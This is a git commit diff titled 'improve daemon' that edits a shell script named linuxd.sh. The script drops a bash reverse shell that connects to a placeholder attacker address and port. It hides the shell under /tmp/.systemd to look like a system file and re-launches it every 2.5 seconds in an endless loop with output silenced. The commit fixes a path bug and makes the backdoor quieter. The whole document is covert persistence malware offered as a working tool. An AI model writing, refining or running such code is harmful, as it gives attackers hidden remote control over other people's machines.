d8b9343e5b804e03d359884192f6d224d04b1332
GermanBread <nd01@online.de>
2021-08-16 14:21:26 +0200

    improve daemon

--- linuxd.sh
+++ linuxd.sh
@@ -2,15 +2,14 @@
 _addr=IP_ADDRESS
 _port=PORT
 
-_private=$(find /tmp 2>/dev/null | grep 'systemd-private' | shuf | head -n 1)
-[ -z $_private ] && _private='/tmp/.systemd'
+_private='/tmp/.systemd'
 mkdir -m 750 -p $_private
-cat << END > /tmp/$_private/.rev
+cat << END > $_private/.rev
 #!/bin/bash
 bash -i >& /dev/tcp/$_addr/$_port 0>&1
 END
 
 while true; do
-    bash /tmp/$_private/.rev
-    sleep 5s
+    bash $_private/.rev &>/dev/null
+    sleep 2.5s
 done
